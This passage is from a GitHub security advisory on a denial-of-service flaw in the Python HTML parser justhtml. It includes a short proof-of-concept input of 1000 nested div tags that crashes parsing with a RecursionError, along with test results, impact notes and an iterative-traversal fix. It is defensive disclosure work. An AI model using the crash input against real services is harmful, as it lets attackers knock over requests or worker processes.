<p>Note: the library already uses iterative traversal in several comparable functions (e.g., <code>_node_to_html_compact</code> at <a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/serialize.py#L197"><code>serialize.py#L197</code></a>, <code>_to_text_collect</code> at <a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/node.py#L161"><code>node.py#L161</code></a>, <code>_is_blocky_element</code> at <a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/serialize.py#L405"><code>serialize.py#L405</code></a>, <code>apply_to_children</code> at <a href="https://github.com/EmilStenstrom/justhtml/blob/a866b6077770d9ec4cb6b6f9bfe7c918f98455e4/src/justhtml/transforms.py#L1642"><code>transforms.py#L1642</code></a>), demonstrating the correct pattern.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">from justhtml import JustHTML

html = "&lt;div&gt;" * 1000 + "x" + "&lt;/div&gt;" * 1000
doc = JustHTML(html)  # raises RecursionError
</code></pre>
<p>Test environment: CPython 3.14.3, macOS ARM64 (Apple Silicon), justhtml 1.9.1, default recursion limit (1000)</p>
<table>
<thead>
<tr>
<th>Input</th>
<th>Size</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;div&gt;</code> × 500</td>
<td>5,501 bytes</td>
<td>OK</td>
</tr>
<tr>
<td><code>&lt;div&gt;</code> × 800</td>
<td>8,801 bytes</td>
<td>OK</td>
</tr>
<tr>
<td><code>&lt;div&gt;</code> × 1000</td>
<td>11,001 bytes</td>
<td>RecursionError</td>
</tr>
</tbody></table>
<p>The error occurs with both <code>sanitize=True</code> (default) and <code>sanitize=False</code>.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can supply HTML for parsing can trigger an unhandled <code>RecursionError</code> during <code>JustHTML()</code> construction. The error is triggered during construction and is not avoided by <code>justhtml</code> configuration alone; mitigating it requires host-application exception handling or input constraints. Depending on the host application's exception handling, this can abort parsing, fail requests, or terminate a worker/process.</p>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Convert the recursive tree traversal functions to iterative implementations using an explicit stack. Example for <code>_find_elements</code>:</p>
<pre><code class="language-python">def _find_elements(self, node: Any, name: str, result: list[Any]) -&gt; None:
    stack = [node]
    while stack:
        current = stack.pop()
        if current.name == name:
            result.append(current)
        if current.has_child_nodes():
            stack.extend(reversed(current.children))
</code></pre>
<p>The same conversion should be applied to <code>_find_element</code>, <code>clone_node(deep=True)</code>, <code>_node_to_html()</code>, and <code>_to_markdown_walk()</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-v7cf-c9rm-wm3j">https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-v7cf-c9rm-wm3j</a></li>
<li><a href="https://github.com/EmilStenstrom/justhtml/releases/tag/v1.10.0">https://github.com/EmilStenstrom/justhtml/releases/tag/v1.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-v7cf-c9rm-wm3j">https://github.com/advisories/GHSA-v7cf-c9rm-wm3j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v7cf-c9rm-wm3j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T14:07:38.000Z</published>
    </entry>
</feed>